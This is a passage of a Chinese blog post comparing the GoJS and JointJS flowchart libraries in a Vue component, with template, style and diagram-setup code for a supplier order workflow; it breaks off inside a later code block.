<p>看里面的demo我自己包装了一下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"background-color:#d5d5d5;margin:0;padding:5px;"</span>&gt;</span></span><br><span class="line">    您当前处于 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tip"</span>&gt;</span>用户提交资料<span class="tag">&lt;/<span class="name">span</span>&gt;</span> 步骤 </span><br><span class="line">    下一步等待<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tip"</span>&gt;</span>供应商接单<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-if</span>=<span class="string">"show===false"</span> @<span class="attr">click</span>=<span class="string">"show=true"</span>&gt;</span>展开<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-else</span> @<span class="attr">click</span>=<span class="string">"show=false"</span>&gt;</span>收起<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"myDiagramDiv"</span> <span class="attr">v-show</span>=<span class="string">"show"</span>  &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.tip</span>&#123;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">color</span><span class="selector-pseudo">:red</span>;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">font-size</span><span class="selector-pseudo">:0.8em</span>;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">font-weight</span><span class="selector-pseudo">:bold</span>;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">padding</span><span class="selector-pseudo">:5px</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-id">#myDiagramDiv</span>&#123;</span></span><br><span class="line"><span class="undefined">  height: 200px; </span></span><br><span class="line"><span class="css">  <span class="selector-tag">border</span>: <span class="selector-tag">solid</span> 1<span class="selector-tag">px</span> <span class="selector-id">#d3d3d3</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.go =<span class="built_in">require</span>(<span class="string">'./go.js'</span>) </span><br><span class="line"><span class="keyword">var</span> $ = go.GraphObject.make;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> datam <span class="keyword">from</span> <span class="string">'./data'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">  mixins:[datam],</span><br><span class="line">  data()&#123;</span><br><span class="line">    <span class="keyword">return</span>&#123;</span><br><span class="line">      myDiagram:<span class="literal">null</span>,</span><br><span class="line">      show:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted()&#123;</span><br><span class="line">    <span class="keyword">this</span>.load();</span><br><span class="line">  &#125;,</span><br><span class="line">  methods:&#123;</span><br><span class="line">    load()&#123;</span><br><span class="line">      <span class="keyword">this</span>.init();</span><br><span class="line">      <span class="keyword">this</span>.addNodeTemplate(<span class="keyword">this</span>.User);</span><br><span class="line">      <span class="keyword">this</span>.addNodeTemplate(<span class="keyword">this</span>.Supplier);</span><br><span class="line">      <span class="keyword">this</span>.layout();</span><br><span class="line">    &#125;,</span><br><span class="line">    layout() &#123;</span><br><span class="line">      <span class="keyword">this</span>.myDiagram.model = go.Model.fromJson(<span class="keyword">this</span>.myjson);</span><br><span class="line">      <span class="keyword">this</span>.myDiagram.layoutDiagram(<span class="literal">true</span>);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    getOption()&#123;</span><br><span class="line">      <span class="comment">// for conciseness in defining templates</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> options=&#123;</span><br><span class="line">        yellowgrad : $(go.Brush, <span class="string">"Linear"</span>, &#123; <span class="number">0</span>: <span class="string">"rgb(254, 201, 0)"</span>, <span class="number">1</span>: <span class="string">"rgb(254, 162, 0)"</span> &#125;),</span><br><span class="line">        greengrad : $(go.Brush, <span class="string">"Linear"</span>, &#123; <span class="number">0</span>: <span class="string">"#98FB98"</span>, <span class="number">1</span>: <span class="string">"#9ACD32"</span> &#125;),</span><br><span class="line">        bluegrad : $(go.Brush, <span class="string">"Linear"</span>, &#123; <span class="number">0</span>: <span class="string">"#B0E0E6"</span>, <span class="number">1</span>: <span class="string">"#87CEEB"</span> &#125;),</span><br><span class="line">        redgrad : $(go.Brush, <span class="string">"Linear"</span>, &#123; <span class="number">0</span>: <span class="string">"#C45245"</span>, <span class="number">1</span>: <span class="string">"#871E1B"</span> &#125;),</span><br><span class="line">        whitegrad : $(go.Brush, <span class="string">"Linear"</span>, &#123; <span class="number">0</span>: <span class="string">"#F0F8FF"</span>, <span class="number">1</span>: <span class="string">"#E6E6FA"</span> &#125;),</span><br><span class="line">        bigfont : <span class="string">"bold 8pt Helvetica, Arial, sans-serif"</span>,</span><br><span class="line">        smallfont : <span class="string">"bold 6pt Helvetica, Arial, sans-serif"</span>,</span><br><span class="line">        </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> options;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">     textStyle()&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          margin: <span class="number">6</span>,</span><br><span class="line">          wrap: go.TextBlock.WrapFit,</span><br><span class="line">          textAlign: <span class="string">"center"</span>,</span><br><span class="line">          editable: <span class="literal">true</span>,</span><br><span class="line">          font: <span class="keyword">this</span>.getOption()[<span class="string">'bigfont'</span>]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      init()&#123;</span><br><span class="line">        <span class="keyword">this</span>.myDiagram =</span><br><span class="line">            $(go.Diagram, <span class="string">"myDiagramDiv"</span>,</span><br><span class="line">              &#123;</span><br><span class="line">                isReadOnly: <span class="literal">true</span>,</span><br><span class="line">                <span class="comment">// have mouse wheel events zoom in and out instead of scroll up and down</span></span><br><span class="line">                <span class="string">"toolManager.mouseWheelBehavior"</span>: go.ToolManager.WheelNone,</span><br><span class="line">                initialAutoScale: go.Diagram.Uniform,</span><br><span class="line">                <span class="string">"linkingTool.direction"</span>: go.LinkingTool.ForwardsOnly,</span><br><span class="line">                initialContentAlignment: go.Spot.Center,</span><br><span class="line">                layout: $(go.LayeredDigraphLayout, &#123; <span class="attr">isInitial</span>: <span class="literal">false</span>, <span class="attr">isOngoing</span>: <span class="literal">false</span>, <span class="attr">layerSpacing</span>: <span class="number">50</span> &#125;),</span><br><span class="line">                <span class="string">"undoManager.isEnabled"</span>: <span class="literal">true</span></span><br><span class="line">              &#125;);</span><br><span class="line">              <span class="comment">//默认节点模板</span></span><br><span class="line">        <span class="keyword">this</span>.myDiagram.nodeTemplate =</span><br><span class="line">            $(go.Node, <span class="string">"Auto"</span>,</span><br><span class="line">              <span class="keyword">new</span> go.Binding(<span class="string">"location"</span>, <span class="string">"loc"</span>, go.Point.parse).makeTwoWay(go.Point.stringify),</span><br><span class="line">              <span class="comment">// define the node's outer shape, which will surround the TextBlock</span></span><br><span class="line">              $(go.Shape, <span class="string">"Rectangle"</span>,</span><br><span class="line">                &#123; <span class="attr">fill</span>: <span class="keyword">this</span>.getOption()[<span class="string">'yellowgrad'</span>], <span class="attr">stroke</span>: <span class="string">"black"</span>,</span><br><span class="line">                  portId: <span class="string">""</span>, <span class="attr">fromLinkable</span>: <span class="literal">true</span>, <span class="attr">toLinkable</span>: <span class="literal">true</span>, <span class="attr">cursor</span>: <span class="string">"pointer"</span>,</span><br><span class="line">                  toEndSegmentLength: <span class="number">50</span>, <span class="attr">fromEndSegmentLength</span>: <span class="number">40</span> &#125;),</span><br><span class="line">              $(go.TextBlock, <span class="string">"Page"</span>,</span><br><span class="line">                &#123; <span class="attr">margin</span>: <span class="number">6</span>,</span><br><span class="line">                  font: <span class="keyword">this</span>.getOption()[<span class="string">'bigfont'</span>],</span><br><span class="line">                  editable: <span class="literal">true</span> &#125;,</span><br><span class="line">                <span class="keyword">new</span> go.Binding(<span class="string">"text"</span>, <span class="string">"text"</span>).makeTwoWay()));</span><br><span class="line">            <span class="comment">// replace the default Link template in the linkTemplateMap</span></span><br><span class="line">          <span class="keyword">this</span>.myDiagram.linkTemplate =</span><br><span class="line">                $(go.Link,  <span class="comment">// the whole link panel</span></span><br><span class="line">                  <span class="keyword">new</span> go.Binding(<span class="string">"points"</span>).makeTwoWay(),</span><br><span class="line">                  &#123; <span class="attr">curve</span>: go.Link.Bezier, <span class="attr">toShortLength</span>: <span class="number">15</span> &#125;,</span><br><span class="line">                  <span class="keyword">new</span> go.Binding(<span class="string">"curviness"</span>, <span class="string">"curviness"</span>),</span><br><span class="line">                  $(go.Shape,  <span class="comment">// the link shape</span></span><br><span class="line">                    &#123; <span class="attr">stroke</span>: <span class="string">"#2F4F4F"</span>, <span class="attr">strokeWidth</span>: <span class="number">2.5</span> &#125;),</span><br><span class="line">                  $(go.Shape,  <span class="comment">// the arrowhead</span></span><br><span class="line">                    &#123; <span class="attr">toArrow</span>: <span class="string">"kite"</span>, <span class="attr">fill</span>: <span class="string">"#2F4F4F"</span>, <span class="attr">stroke</span>: <span class="literal">null</span>, <span class="attr">scale</span>: <span class="number">2</span> &#125;)</span><br><span class="line">                  );</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">/**</span></span><br><span class="line"><span class="comment">       * options:&#123;</span></span><br><span class="line"><span class="comment">       *  category</span></span><br><span class="line"><span class="comment">       *  shape:RoundedRectangle/Rectangle</span></span><br><span class="line"><span class="comment">       *  shapeOptions:&#123;</span></span><br><span class="line"><span class="comment">       *   fill:bluegrad/greengrad/yellowgrad/null/redgrad/whitegrad  自定义的</span></span><br><span class="line"><span class="comment">       *   stroke: "black",</span></span><br><span class="line"><span class="comment">       *   portId:""</span></span><br><span class="line"><span class="comment">       *   fromLinkable:true</span></span><br><span class="line"><span class="comment">       *   toLinkable:</span></span><br><span class="line"><span class="comment">       *   cursor:"pointer"</span></span><br><span class="line"><span class="comment">       *   fromEndSegmentLength:40</span></span><br><span class="line"><span class="comment">       *    toEndSegmentLength</span></span><br><span class="line"><span class="comment">       *    strokeWidth</span></span><br><span class="line"><span class="comment">       *  </span></span><br><span class="line"><span class="comment">       *   &#125;</span></span><br><span class="line"><span class="comment">       *    textStyle:&#123;</span></span><br><span class="line"><span class="comment">       *        margin: 9,</span></span><br><span class="line"><span class="comment">       *        maxSize: new go.Size(200, NaN),</span></span><br><span class="line"><span class="comment">       *        wrap: go.TextBlock.WrapFit,</span></span><br><span class="line"><span class="comment">        *       editable: true,</span></span><br><span class="line"><span class="comment">        *       textAlign: "center",</span></span><br><span class="line"><span class="comment">        *       font: smallfont </span></span><br><span class="line"><span class="comment">        * &#125;,</span></span><br><span class="line"><span class="comment">       *    </span></span><br><span class="line"><span class="comment">       * &#125;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      addNodeTemplate(options)&#123;</span><br><span class="line">        <span class="keyword">let</span> fill = <span class="keyword">this</span>.getOption()[options.shapeOptions.fill];</span><br><span class="line">        options.shapeOptions.fill = fill;</span><br><span class="line">        <span class="keyword">this</span>.myDiagram.nodeTemplateMap.add(options.category,</span><br><span class="line">          $(go.Node, <span class="string">"Auto"</span>,</span><br><span class="line">            <span class="keyword">new</span> go.Binding(<span class="string">"location"</span>, <span class="string">"loc"</span>, go.Point.parse).makeTwoWay(go.Point.stringify),</span><br><span class="line">            $(go.Shape, options.shape,options.shapeOptions),</span><br><span class="line">            $(go.TextBlock,  <span class="keyword">this</span>.textStyle(),</span><br><span class="line">              <span class="keyword">new</span> go.Binding(<span class="string">"text"</span>, <span class="string">"text"</span>).makeTwoWay())</span><br><span class="line">            ));</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>不满意的地方</strong>：</p>
<ol>
<li>免费版gojs是有水印的，百度搜索“gojs如何去水印”有一堆答案，我就不写了。</li>
<li>因为要自己手动去掉水印，所以我只能手动下载go.js放在我自己的组件目录下，但是这个文件太大了，800+KB,<br>npm run dev 的时候停在这里停了好久。有时候还爆出“……maximun ….500KB”的错误，我也不知道是什么原因，不知道有什么方法，有的话麻烦通知我。</li>
<li>代码写法有点太繁琐</li>
</ol>
<p>这是我自己包装的代码地址：<a href="https://github.com/LRY1994/vue-lib/tree/master/src/components/process-go" target="_blank" rel="noopener">https://github.com/LRY1994/vue-lib/tree/master/src/components/process-go</a></p>
<h3 id="jointjs"><a href="#jointjs" class="headerlink" title="jointjs"></a>jointjs</h3><p>github : <a href="https://github.com/clientIO/joint" target="_blank" rel="noopener">https://github.com/clientIO/joint</a><br>效果图<br><img src="/study/2018/8/procedure/jointjs.png"></p>
<p>可以通过<code>npm install jointjs -save</code>安装</p>
<p>参照了很多demo和文档，用的是矩形，但是可以设置圆角的度数变成椭圆形，其他形状我就无力了。</p>
<p>可以自定义矩形的样式和矩形框里面的文字样式</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//data.vue</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        <span class="keyword">var</span> userClass = &#123;<span class="comment">//这个要参照SVG属性</span></span><br><span class="line">            <span class="comment">/**shapeStyle</span></span><br><span class="line"><span class="comment">             * fill:填充的背景颜色</span></span><br><span class="line"><span class="comment">                stroke: 边框颜色</span></span><br><span class="line"><span class="comment">                strokeWidth: 边框宽度</span></span><br><span class="line"><span class="comment">                rx: 圆角</span></span><br><span class="line"><span class="comment">                ry: </span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            shapeStyle:&#123;<span class="comment">//矩形样式</span></span><br><span class="line">                fill:&#123;</span><br><span class="line">                    type: <span class="string">'linearGradient'</span>,</span><br><span class="line">                    stops: [</span><br><span class="line">                        &#123;<span class="attr">offset</span>: <span class="string">'0%'</span>, <span class="attr">color</span>: <span class="string">'#98FB98'</span>&#125;,</span><br><span class="line">                        &#123;<span class="attr">offset</span>: <span class="string">'100%'</span>, <span class="attr">color</span>: <span class="string">'#9ACD32'</span>&#125;</span><br><span class="line">                    ],</span><br><span class="line">                &#125;,</span><br><span class="line">                rx:<span class="number">150</span>,</span><br><span class="line">                ry:<span class="number">15</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * textStyle</span></span><br><span class="line"><span class="comment">             *  fontWeight</span></span><br><span class="line"><span class="comment">             *  fontSize</span></span><br><span class="line"><span class="comment">             * </span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            textStyle:&#123;<span class="comment">//文本样式</span></span><br><span class="line">                fontWeight:<span class="string">'bold'</span></span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span>&#123;</span><br><span class="line">            graphData :&#123;</span><br><span class="line">                node:&#123;</span><br><span class="line">                    <span class="string">'100'</span>:&#123;<span class="attr">text</span>:<span class="string">'用户提交资料'</span>,<span class="attr">category</span>:userClass&#125;,</span><br><span class="line">                    <span class="string">'101'</span>:&#123;<span class="attr">text</span>:<span class="string">'用户完善资料'</span>,<span class="attr">category</span>:userClass&#125;,</span><br><span class="line">                    <span class="string">'102'</span>:&#123;<span class="attr">text</span>:<span class="string">'用户确认完成'</span>,<span class="attr">category</span>:userClass&#125;,</span><br><span class="line">                    <span class="string">'103'</span>:&#123;<span class="attr">text</span>:<span class="string">'用户撤销'</span>,<span class="attr">category</span>:userClass&#125;,</span><br><span class="line"></span><br><span class="line">                    <span class="string">'200'</span>:&#123;<span class="attr">text</span>:<span class="string">'供应商驳回'</span>&#125;,</span><br><span class="line">                    <span class="string">'201'</span>:&#123;<span class="attr">text</span>:<span class="string">'供应商接单'</span>&#125;,</span><br><span class="line">                    <span class="string">'202'</span>:&#123;<span class="attr">text</span>:<span class="string">'供应商完工'</span>&#125;,</span><br><span class="line">                    <span class="string">'203'</span>:&#123;<span class="attr">text</span>:<span class="string">'等待供应商处理'</span>&#125;,</span><br><span class="line"></span><br><span class="line">                    <span class="string">'300'</span>:&#123;<span class="attr">text</span>:<span class="string">'系统交付出错'</span>&#125;               </span><br><span class="line">                &#125;,</span><br><span class="line">                edge :&#123;<span class="comment">//每个点都要写</span></span><br><span class="line">                    <span class="string">'100'</span>: [<span class="string">'200'</span>,<span class="string">'201'</span>,<span class="string">'103'</span>], </span><br><span class="line">                    <span class="string">'101'</span>: [<span class="string">'201'</span>],</span><br><span class="line">                    <span class="string">'102'</span>:[],</span><br><span class="line">                    <span class="string">'103'</span>: [<span class="string">'100'</span>],</span><br><span class="line"></span><br><span class="line">                    <span class="string">'200'</span>: [<span class="string">'101'</span>],              </span><br><span class="line">                    <span class="string">'201'</span>: [<span class="string">'202'</span>,<span class="string">'300'</span>],</span><br><span class="line">                    <span class="string">'202'</span>: [<span class="string">'102'</span>],               </span><br><span class="line">                    <span class="string">'203'</span>: [<span class="string">'102'</span>], </span><br><span class="line"></span><br><span class="line">                    <span class="string">'300'</span>: [<span class="string">'203'</span>],</span><br><span class="line">                </span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"background-color:#EEEEEE;margin:0;padding:5px;font-size:0.9em"</span>&gt;</span></span><br><span class="line">    您当前处于 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tip"</span>&gt;</span>用户提交资料<span class="tag">&lt;/<span class="name">span</span>&gt;</span> 步骤 </span><br><span class="line">    下一步等待<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tip"</span>&gt;</span>供应商接单<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-if</span>=<span class="string">"show===false"</span> @<span class="attr">click</span>=<span class="string">"show=true"</span>&gt;</span>展开<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-else</span> @<span class="attr">click</span>=<span class="string">"show=false"</span>&gt;</span>收起<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"myholder"</span> <span class="attr">v-show</span>=<span class="string">"show"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span 